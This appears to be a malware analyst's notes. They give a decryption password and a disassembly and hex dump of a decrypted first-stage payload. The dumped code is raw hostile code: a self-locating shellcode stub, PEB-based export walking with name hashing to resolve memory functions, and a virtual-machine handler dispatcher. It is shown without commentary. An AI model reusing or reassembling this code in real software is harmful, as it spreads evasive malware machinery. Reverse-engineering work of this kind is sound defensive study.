3531_4ever = password used to decrypt data through pipe.

-----------------------------------------------------------------------------------------------

DECRYPTED first part (VM):

8a232000 e800000000	call    8a232005
8a232005 5b                	pop     ebx
8a232006 83eb05          	sub     ebx,5
8a232009 b8d80a0000      	mov     eax,0AD8h
8a23200e 83c078          	add     eax,78h
8a232011 83f800          	cmp     eax,0
8a232014 7413            	je      8a232029
8a232016 0500100000      	add     eax,1000h
8a23201b 83f87b          	cmp     eax,7Bh
8a23201e 7409            	je      8a232029
8a232020 0500060000      	add     eax,600h
8a232025 03c3            	add     eax,ebx
8a232027 ffe0            	jmp     eax
8a232029 0534020000      	add     eax,234h
8a23202e ffe0            	jmp     eax
8a232030 c3              	ret

8a232000  e8 00 00 00 00 5b 83 eb-05 b8 d8 0a 00 00 83 c0  .....[..........
8a232010  78 83 f8 00 74 13 05 00-10 00 00 83 f8 7b 74 09  x...t........{t.
8a232020  05 00 06 00 00 03 c3 ff-e0 05 34 02 00 00 ff e0  ..........4.....
8a232030  c3 cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
8a232040  55 8b ec 51 c7 45 fc 00-00 00 00 eb 09 8b 45 fc  U..Q.E........E.
8a232050  83 c0 01 89 45 fc 8b 4d-fc 3b 4d 10 73 12 8b 55  ....E..M.;M.s..U
8a232060  08 03 55 fc 8b 45 0c 03-45 fc 8a 08 88 0a eb dd  ..U..E..E.......
8a232070  8b e5 5d c2 0c 00 cc cc-cc cc cc cc cc cc cc cc  ..].............
8a232080  55 8b ec 51 c7 45 fc 00-00 00 00 eb 09 8b 45 fc  U..Q.E........E.
8a232090  83 c0 01 89 45 fc 8b 4d-0c 03 4d fc 0f be 11 85  ....E..M..M.....
8a2320a0  d2 74 12 8b 45 08 03 45-fc 8b 4d 0c 03 4d fc 8a  .t..E..E..M..M..
8a2320b0  11 88 10 eb d8 0f b6 45-10 85 c0 74 09 8b 4d 08  .......E...t..M.
8a2320c0  03 4d fc c6 01 00 8b e5-5d c2 0c 00 cc cc cc cc  .M......].......
8a2320d0  55 8b ec 51 c7 45 fc 00-00 00 00 eb 09 8b 45 fc  U..Q.E........E.
8a2320e0  83 c0 01 89 45 fc 8b 4d-fc 3b 4d 10 73 0d 8b 55  ....E..M.;M.s..U
8a2320f0  08 03 55 fc 8a 45 0c 88-02 eb e2 8b e5 5d c2 0c  ..U..E.......]..
8a232100  00 cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
8a232110  55 8b ec 51 c7 45 fc 00-00 00 00 eb 09 8b 45 fc  U..Q.E........E.
8a232120  83 c0 01 89 45 fc 8b 4d-08 03 4d fc 0f be 11 85  ....E..M..M.....
8a232130  d2 74 26 8b 45 08 03 45-fc 0f be 08 0f b6 55 0c  .t&.E..E......U.
8a232140  33 ca 8b 45 08 03 45 fc-88 08 0f b6 4d 10 0f b6  3..E..E.....M...
8a232150  55 0c 03 d1 88 55 0c eb-c4 8b e5 5d c2 0c 00 cc  U....U.....]....
8a232160  55 8b ec 83 ec 08 c6 45-ff e0 c7 45 f8 00 00 00  U......E...E....
8a232170  00 eb 09 8b 45 f8 83 c0-01 89 45 f8 8b 4d 08 03  ....E.....E..M..
8a232180  4d f8 0f be 11 85 d2 74-35 8b 45 08 03 45 f8 0f  M......t5.E..E..
8a232190  be 08 83 f9 41 7c 25 8b-55 08 03 55 f8 0f be 02  ....A|%.U..U....
8a2321a0  83 f8 5a 7f 17 0f be 4d-ff 8b 55 08 03 55 f8 0f  ..Z....M..U..U..
8a2321b0  be 02 2b c1 8b 4d 08 03-4d f8 88 01 eb b5 8b e5  ..+..M..M.......
8a2321c0  5d c2 04 00 cc cc cc cc-cc cc cc cc cc cc cc cc  ]...............
8a2321d0  55 8b ec 83 ec 08 c6 45-ff e0 c7 45 f8 00 00 00  U......E...E....
8a2321e0  00 eb 09 8b 45 f8 83 c0-01 89 45 f8 8b 4d f8 8b  ....E.....E..M..
8a2321f0  55 08 0f b7 04 4a 85 c0-74 3a 8b 4d f8 8b 55 08  U....J..t:.M..U.
8a232200  0f b7 04 4a 83 f8 41 7c-29 8b 4d f8 8b 55 08 0f  ...J..A|).M..U..
8a232210  b7 04 4a 83 f8 5a 7f 1a-0f be 4d ff 8b 55 f8 8b  ..J..Z....M..U..
8a232220  45 08 0f b7 14 50 2b d1-8b 45 f8 8b 4d 08 66 89  E....P+..E..M.f.
8a232230  14 41 eb af 8b e5 5d c2-04 00 cc cc cc cc cc cc  .A....].........
8a232240  55 8b ec 83 ec 08 83 7d-08 00 75 04 33 c0 eb 3e  U......}..u.3..>
8a232250  c7 45 fc 00 00 00 00 c7-45 f8 00 00 00 00 eb 09  .E......E.......
8a232260  8b 45 f8 83 c0 01 89 45-f8 8b 4d 08 03 4d f8 0f  .E.....E..M..M..
8a232270  be 11 85 d2 74 15 c1 4d-fc 09 8b 45 08 03 45 f8  ....t..M...E..E.
8a232280  0f be 08 33 4d fc 89 4d-fc eb d5 8b 45 fc 8b e5  ...3M..M....E...
8a232290  5d c2 04 00 cc cc cc cc-cc cc cc cc cc cc cc cc  ]...............
8a2322a0  55 8b ec 83 ec 08 83 7d-08 00 75 04 33 c0 eb 40  U......}..u.3..@
8a2322b0  c7 45 fc 00 00 00 00 c7-45 f8 00 00 00 00 eb 09  .E......E.......
8a2322c0  8b 45 f8 83 c0 01 89 45-f8 8b 4d f8 8b 55 08 0f  .E.....E..M..U..
8a2322d0  b7 04 4a 85 c0 74 16 c1-4d fc 09 8b 4d f8 8b 55  ..J..t..M...M..U
8a2322e0  08 0f b7 04 4a 33 45 fc-89 45 fc eb d3 8b 45 fc  ....J3E..E....E.
8a2322f0  8b e5 5d c2 04 00 cc cc-cc cc cc cc cc cc cc cc  ..].............
8a232300  55 8b ec 83 ec 24 8b 45-08 89 45 fc 8b 4d 08 89  U....$.E..E..M..
8a232310  4d f0 8b 55 f0 8b 45 fc-03 42 3c 89 45 ec b9 08  M..U..E..B<.E...
8a232320  00 00 00 6b d1 00 8b 45-ec 8b 4d fc 03 4c 10 78  ...k...E..M..L.x
8a232330  89 4d f4 8b 55 f4 8b 45-fc 03 42 20 89 45 e8 8b  .M..U..E..B .E..
8a232340  4d f4 8b 55 fc 03 51 24-89 55 e0 8b 45 f4 8b 4d  M..U..Q$.U..E..M
8a232350  fc 03 48 1c 89 4d dc c7-45 f8 00 00 00 00 eb 09  ..H..M..E.......
8a232360  8b 55 f8 83 c2 01 89 55-f8 8b 45 f4 8b 4d f8 3b  .U.....U..E..M.;
8a232370  48 14 73 36 8b 55 f8 8b-45 e8 8b 4d fc 03 0c 90  H.s6.U..E..M....
8a232380  51 e8 ba fe ff ff 89 45-e4 8b 55 0c 3b 55 e4 75  Q......E..U.;U.u
8a232390  17 8b 45 f8 8b 4d e0 0f-b7 14 41 8b 45 dc 8b 4d  ..E..M....A.E..M
8a2323a0  fc 03 0c 90 8b c1 eb 04-eb b6 33 c0 8b e5 5d c2  ..........3...].
8a2323b0  08 00 cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
8a2323c0  55 8b ec 81 ec 0c 02 00-00 e8 b2 00 00 00 89 45  U..............E
8a2323d0  f8 8b 45 f8 8b 48 0c 8b-51 1c 89 55 fc 8b 45 fc  ..E..H..Q..U..E.
8a2323e0  0f b7 48 1c 83 c1 02 51-8b 55 fc 8b 42 20 50 8d  ..H....Q.U..B P.
8a2323f0  8d f4 fd ff ff 51 e8 45-fc ff ff 8d 95 f4 fd ff  .....Q.E........
8a232400  ff 52 e8 c9 fd ff ff 8d-85 f4 fd ff ff 50 e8 8d  .R...........P..
8a232410  fe ff ff 89 45 f4 8b 4d-08 3b 4d f4 75 08 8b 55  ....E..M.;M.u..U
8a232420  fc 8b 42 08 eb 18 8b 45-fc 8b 08 89 4d fc 8b 55  ..B....E....M..U
8a232430  f8 8b 42 0c 8b 4d fc 3b-48 1c 75 a1 33 c0 8b e5  ..B..M.;H.u.3...
8a232440  5d c2 04 00 cc cc cc cc-cc cc cc cc cc cc cc cc  ]...............
8a232450  55 8b ec 81 7d 08 00 01-00 00 73 06 33 c0 eb 19  U...}.....s.3...
8a232460  eb 17 81 7d 08 00 00 01-00 73 09 b8 01 00 00 00  ...}.....s......
8a232470  eb 07 eb 05 b8 02 00 00-00 5d c2 04 00 cc cc cc  .........]......
8a232480  64 a1 30 00 00 00 c3 cc-cc cc cc cc cc cc cc cc  d.0.............
8a232490  55 8b ec 51 89 4d fc 8b-45 fc c6 80 fc 03 00 00  U..Q.M..E.......
8a2324a0  00 8b 4d fc c7 81 fd 03-00 00 00 00 00 00 8b 55  ..M............U
8a2324b0  fc c7 82 01 04 00 00 00-00 00 00 8b 45 fc c7 80  ............E...
8a2324c0  05 04 00 00 00 00 00 00-8b 4d fc c7 81 09 04 00  .........M......
8a2324d0  00 00 00 00 00 8b 55 fc-c7 82 0d 04 00 00 00 00  ......U.........
8a2324e0  00 00 8b 45 fc c7 80 11-04 00 00 00 00 00 00 8b  ...E............
8a2324f0  4d fc c6 81 15 04 00 00-00 8b 55 fc c7 82 56 04  M.........U...V.
8a232500  00 00 00 00 00 00 8b 45-fc c7 80 5a 04 00 00 00  .......E...Z....
8a232510  00 00 00 8b 4d fc c7 81-5e 04 00 00 00 00 00 00  ....M...^.......
8a232520  8b 55 fc c7 82 62 04 00-00 00 00 00 00 8b 45 fc  .U...b........E.
8a232530  c7 80 66 04 00 00 00 00-00 00 8b 4d fc e8 4e 02  ..f........M..N.
8a232540  00 00 8b 45 fc 8b e5 5d-c3 cc cc cc cc cc cc cc  ...E...]........
8a232550  55 8b ec 51 89 4d fc 8b-45 fc 83 b8 fd 03 00 00  U..Q.M..E.......
8a232560  00 74 12 8b 4d fc 8b 91-fd 03 00 00 52 8b 4d fc  .t..M.......R.M.
8a232570  e8 db 05 00 00 8b 45 fc-83 b8 66 04 00 00 00 74  ......E...f....t
8a232580  12 8b 4d fc 8b 91 66 04-00 00 52 8b 4d fc e8 bd  ..M...f...R.M...
8a232590  05 00 00 8b e5 5d c3 cc-cc cc cc cc cc cc cc cc  .....]..........
8a2325a0  55 8b ec 83 ec 0c 89 4d-fc 8b 45 fc 8b 4d 18 89  U......M..E..M..
8a2325b0  88 0d 04 00 00 8b 55 fc-8b 45 1c 89 82 11 04 00  ......U..E......
8a2325c0  00 8b 4d fc 8b 55 14 89-91 05 04 00 00 83 7d 10  ..M..U........}.
8a2325d0  00 75 21 8b 45 fc 83 b8-05 04 00 00 00 75 15 68  .u!.E........u.h
8a2325e0  28 ac b9 19 e8 d7 fd ff-ff 8b 4d fc 89 81 09 04  (.........M.....
8a2325f0  00 00 eb 0c 8b 55 fc 8b-45 10 89 82 09 04 00 00  .....U..E.......
8a232600  6a 40 8b 4d 0c 51 8b 4d-fc e8 b2 04 00 00 89 45  j@.M.Q.M.......E
8a232610  f8 8b 55 0c 52 8b 45 08-50 8b 4d f8 51 e8 1e fa  ..U.R.E.P.M.Q...
8a232620  ff ff 8b 55 fc 8b 45 f8-89 82 fd 03 00 00 8b 4d  ...U..E........M
8a232630  fc 8b 55 0c 89 91 01 04-00 00 8b 45 fc 8b 4d fc  ..U........E..M.
8a232640  8b 91 fd 03 00 00 89 90-56 04 00 00 8b 4d fc e8  ........V....M..
8a232650  cc 02 00 00 8b 4d fc e8-24 03 00 00 8b 4d fc e8  .....M..$....M..
8a232660  fc 03 00 00 89 45 f4 8b-45 f4 8b e5 5d c2 18 00  .....E..E...]...
8a232670  55 8b ec 83 ec 10 89 4d-fc 8b 45 fc 8b 4d 10 89  U......M..E..M..
8a232680  88 0d 04 00 00 8b 55 fc-8b 45 14 89 82 11 04 00  ......U..E......
8a232690  00 8b 4d fc 8b 55 08 8b-42 0e 89 81 05 04 00 00  ..M..U..B.......
8a2326a0  83 7d 0c 00 75 21 8b 4d-fc 83 b9 05 04 00 00 00  .}..u!.M........
8a2326b0  75 15 68 28 ac b9 19 e8-04 fd ff ff 8b 55 fc 89  u.h(.........U..
8a2326c0  82 09 04 00 00 eb 0c 8b-45 fc 8b 4d 0c 89 88 09  ........E..M....
8a2326d0  04 00 00 6a 40 8b 55 08-8b 42 02 50 8b 4d fc e8  ...j@.U..B.P.M..
8a2326e0  dc 03 00 00 89 45 f8 8b-4d 08 8b 51 02 52 8b 45  .....E..M..Q.R.E
8a2326f0  08 50 8b 4d f8 51 e8 45-f9 ff ff 8b 55 08 8b 45  .P.M.Q.E....U..E
8a232700  f8 03 42 06 89 45 f4 8b-4d 08 8b 55 f8 03 51 0a  ..B..E..M..U..Q.
8a232710  8b 45 fc 89 90 5a 04 00-00 8b 4d fc 8b 55 f8 89  .E...Z....M..U..
8a232720  91 fd 03 00 00 8b 45 fc-8b 4d 08 8b 51 02 89 90  ......E..M..Q...
8a232730  01 04 00 00 8b 45 f8 83-c0 12 8b 4d fc 89 81 56  .....E.....M...V
8a232740  04 00 00 8b 4d fc e8 d5-01 00 00 8b 4d fc e8 2d  ....M.......M..-
8a232750  02 00 00 8b 55 08 0f b7-02 3d 13 37 00 00 74 08  ....U....=.7..t.
8a232760  8b 4d fc e8 f8 02 00 00-8b 4d fc 8b 55 f4 89 91  .M.......M..U...
8a232770  56 04 00 00 8b 4d fc e8-e4 02 00 00 89 45 f0 8b  V....M.......E..
8a232780  45 f0 8b e5 5d c2 10 00-cc cc cc cc cc cc cc cc  E...]...........
8a232790  55 8b ec 83 ec 18 89 4d-fc e8 00 00 00 00 58 89  U......M......X.
8a2327a0  45 ec c7 45 f4 90 17 00-10 8b 45 ec 83 e8 0e 2b  E..E......E....+
8a2327b0  45 f4 89 45 e8 c7 45 f0-00 00 00 00 eb 09 8b 4d  E..E..E........M
8a2327c0  f0 83 c1 01 89 4d f0 81-7d f0 ff 00 00 00 73 0f  .....M..}.....s.
8a2327d0  8b 55 f0 8b 45 fc c7 04-90 e0 22 00 10 eb df b9  .U..E.....".....
8a2327e0  04 00 00 00 6b d1 00 8b-45 fc c7 04 10 00 23 00  ....k...E.....#.
8a2327f0  10 b9 04 00 00 00 c1 e1-00 8b 55 fc c7 04 0a 20  ..........U.... 
8a232800  23 00 10 b8 04 00 00 00-d1 e0 8b 4d fc c7 04 01  #..........M....
8a232810  a0 23 00 10 ba 04 00 00-00 6b c2 03 8b 4d fc c7  .#.......k...M..
8a232820  04 01 40 24 00 10 ba 04-00 00 00 c1 e2 02 8b 45  ..@$...........E
8a232830  fc c7 04 10 90 25 00 10-b9 04 00 00 00 6b d1 05  .....%.......k..
8a232840  8b 45 fc c7 04 10 f0 25-00 10 b9 04 00 00 00 6b  .E.....%.......k
8a232850  d1 06 8b 45 fc c7 04 10-30 26 00 10 b9 04 00 00  ...E....0&......
8a232860  00 6b d1 07 8b 45 fc c7-04 10 60 27 00 10 b9 04  .k...E....`'....
8a232870  00 00 00 c1 e1 03 8b 55-fc c7 04 0a e0 27 00 10  .......U.....'..
8a232880  b8 04 00 00 00 6b c8 09-8b 55 fc c7 04 0a 20 28  .....k...U.... (
8a232890  00 10 b8 04 00 00 00 6b-c8 0a 8b 55 fc c7 04 0a  .......k...U....
8a2328a0  40 28 00 10 b8 04 00 00-00 6b c8 0b 8b 55 fc c7  @(.......k...U..
8a2328b0  04 0a 50 2d 00 10 b8 04-00 00 00 6b c8 0c 8b 55  ..P-.......k...U
8a2328c0  fc c7 04 0a d0 2d 00 10-b8 04 00 00 00 6b c8 0d  .....-.......k..
8a2328d0  8b 55 fc c7 04 0a 30 2e-00 10 c7 45 f8 00 00 00  .U....0....E....
8a2328e0  00 eb 09 8b 45 f8 83 c0-01 89 45 f8 81 7d f8 ff  ....E.....E..}..
8a2328f0  00 00 00 73 23 8b 4d f8-8b 55 fc 8b 04 8a 89 45  ...s#.M..U.....E
8a232900  f4 8b 4d f4 03 4d e8 89-4d f4 8b 55 f8 8b 45 fc  ..M..M..M..U..E.
8a232910  8b 4d f4 89 0c 90 eb cb-8b e5 5d c3 cc cc cc cc  .M........].....
8a232920  55 8b ec 51 89 4d fc 8b-45 fc 83 b8 66 04 00 00  U..Q.M..E...f...
8a232930  00 74 12 8b 4d fc 8b 91-66 04 00 00 52 8b 4d fc  .t..M...f...R.M.
8a232940  e8 0b 02 00 00 6a 04 68-00 00 40 00 8b 4d fc e8  .....j.h..@..M..
8a232950  6c 01 00 00 8b 4d fc 89-81 66 04 00 00 ba 04 00  l....M...f......
8a232960  00 00 69 c2 ff ff 0f 00-8b 4d fc 03 81 66 04 00  ..i......M...f..
8a232970  00 8b 55 fc 89 82 62 04-00 00 8b e5 5d c3 cc cc  ..U...b.....]...
8a232980  55 8b ec 83 ec 08 56 89-4d fc 6a 40 6a 00 8b 45  U.....V.M.j@j..E
8a232990  fc 05 16 04 00 00 50 e8-34 f7 ff ff b9 04 00 00  ......P.4.......
8a2329a0  00 6b d1 06 8b 45 fc 8b-4d fc 8b 89 62 04 00 00  .k...E..M...b...
8a2329b0  89 8c 10 16 04 00 00 ba-04 00 00 00 6b c2 07 8b  ............k...
8a2329c0  4d fc 8b 55 fc 8b 92 fd-03 00 00 89 94 01 16 04  M..U............
8a2329d0  00 00 b8 04 00 00 00 c1-e0 03 8b 4d fc 8b 55 fc  ...........M..U.
8a2329e0  8b 92 01 04 00 00 89 94-01 16 04 00 00 b8 04 00  ................
8a2329f0  00 00 6b c8 09 8b 55 fc-8b 45 fc 8b 80 09 04 00  ..k...U..E......
8a232a00  00 89 84 0a 16 04 00 00-c7 45 f8 0a 00 00 00 eb  .........E......
8a232a10  09 8b 4d f8 83 c1 01 89-4d f8 8b 55 fc 8b 82 0d  ..M.....M..U....
8a232a20  04 00 00 83 c0 0a 39 45-f8 73 25 83 7d f8 10 73  ......9E.s%.}..s
8a232a30  1f 8b 4d fc 8b 91 11 04-00 00 8b 45 f8 8b 4d fc  ..M........E..M.
8a232a40  8b 75 f8 8b 54 b2 d8 89-94 81 16 04 00 00 eb c1  .u..T...........
8a232a50  5e 8b e5 5d c3 cc cc cc-cc cc cc cc cc cc cc cc  ^..]............
8a232a60  55 8b ec 83 ec 08 89 4d-f8 8b 45 f8 c7 80 5e 04  U......M..E...^.
8a232a70  00 00 00 00 00 00 8b 4d-f8 c6 81 fc 03 00 00 01  .......M........
8a232a80  8b 55 f8 0f b6 82 fc 03-00 00 85 c0 74 1c 8b 4d  .U..........t..M
8a232a90  f8 e8 5a 05 00 00 88 45-ff 0f b6 55 ff 8b 45 f8  ..Z....E...U..E.
8a232aa0  8b 4d f8 8b 14 90 ff d2-eb d6 b8 04 00 00 00 6b  .M.............k
8a232ab0  c8 00 8b 55 f8 8b 84 0a-16 04 00 00 8b e5 5d c3  ...U..........].
8a232ac0  55 8b ec 83 ec 10 89 4d-fc c7 45 f8 00 00 00 00  U......M..E.....
8a232ad0  8b 45 fc 83 b8 05 04 00-00 00 75 2e 68 47 93 c3  .E........u.hG..
8a232ae0  90 8b 4d fc 8b 91 09 04-00 00 52 e8 10 f8 ff ff  ..M.......R.....
8a232af0  89 45 f4 8b 45 0c 50 68-00 30 00 00 8b 4d 08 51  .E..E.Ph.0...M.Q
8a232b00  6a 00 ff 55 f4 89 45 f8-eb 2f 8b 55 fc 83 ba 05  j..U..E../.U....
8a232b10  04 00 00 01 75 23 68 a4-7d 8e 2c 8b 45 fc 8b 88  ....u#h.}.,.E...
8a232b20  09 04 00 00 51 e8 d6 f7-ff ff 89 45 f0 8b 55 08  ....Q......E..U.
8a232b30  52 6a 00 ff 55 f0 89 45-f8 8b 45 f8 8b e5 5d c2  Rj..U..E..E...].
8a232b40  08 00 cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
8a232b50  55 8b ec 83 ec 0c 89 4d-fc 8b 45 fc 83 b8 05 04  U......M..E.....
8a232b60  00 00 00 75 27 68 cb c9-a1 83 8b 4d fc 8b 91 09  ...u'h.....M....
8a232b70  04 00 00 52 e8 87 f7 ff-ff 89 45 f8 68 00 80 00  ...R......E.h...
8a232b80  00 6a 00 8b 45 08 50 ff-55 f8 eb 2a 8b 4d fc 83  .j..E.P.U..*.M..
8a232b90  b9 05 04 00 00 01 75 1e-68 e6 82 90 1c 8b 55 fc  ......u.h.....U.
8a232ba0  8b 82 09 04 00 00 50 e8-54 f7 ff ff 89 45 f4 8b  ......P.T....E..
8a232bb0  4d 08 51 ff 55 f4 8b e5-5d c2 04 00 cc cc cc cc  M.Q.U...].......
8a232bc0  55 8b ec 83 ec 50 89 4d-f8 c7 45 f0 65 4d ba 64  U....P.M..E.eM.d
8a232bd0  c7 45 f4 cb f9 bb 64 c6-45 b0 25 c6 45 b1 27 c6  .E....d.E.%.E.'.
8a232be0  45 b2 3d c6 45 b3 2e c6-45 b4 53 c6 45 b5 56 c6  E.=.E...E.S.E.V.
8a232bf0  45 b6 46 c6 45 b7 08 c6-45 b8 1c c6 45 b9 18 c6  E.F.E...E...E...
8a232c00  45 ba 00 33 c0 89 45 bb-89 45 bf 89 45 c3 89 45  E..3..E..E..E..E
8a232c10  c7 89 45 cb 88 45 cf c6-45 d0 27 c6 45 d1 27 c6  ..E..E..E.'.E.'.
8a232c20  45 d2 6a c6 45 d3 03 c6-45 d4 53 c6 45 d5 56 c6  E.j.E...E.S.E.V.
8a232c30  45 d6 46 c6 45 d7 08 c6-45 d8 1c c6 45 d9 18 c6  E.F.E...E...E...
8a232c40  45 da 00 33 c9 89 4d db-89 4d df 89 4d e3 89 4d  E..3..M..M..M..M
8a232c50  e7 89 4d eb 88 4d ef c7-45 fc 00 00 00 00 eb 09  ..M..M..E.......
8a232c60  8b 55 fc 83 c2 01 89 55-fc 83 7d fc 02 73 20 8b  .U.....U..}..s .
